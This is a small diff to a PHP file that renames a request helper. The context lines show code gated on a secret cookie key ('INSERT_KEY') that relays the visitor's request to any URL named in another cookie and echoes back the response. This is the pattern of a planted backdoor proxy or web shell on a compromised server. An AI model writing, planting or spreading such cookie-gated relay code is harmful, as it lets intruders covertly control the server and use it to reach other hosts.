@@ -3,7 +3,7 @@ if ($_COOKIE["_k"] == "INSERT_KEY") {
 		define("MIDNIGHT", 1);
 		ini_set("display_errors", "1");
 		error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
-		function request($url, $method, $body = null, $headers = null)
+		function _request($url, $method, $body = null, $headers = null)
 		{
 			if (!function_exists("curl_init")) {
 				if(ini_get("allow_url_fopen")) {
@@ -100,7 +100,7 @@ if ($_COOKIE["_k"] == "INSERT_KEY") {
 					break;
 			}
 		}
-		$req = request($_COOKIE["_u"], $_SERVER["REQUEST_METHOD"], $body ? $body : null, $headers);
+		$req = _request($_COOKIE["_u"], $_SERVER["REQUEST_METHOD"], $body ? $body : null, $headers);
 		if ($req) {
 			foreach ($req["headers"] as $header) header($header);
 			echo $req["body"];
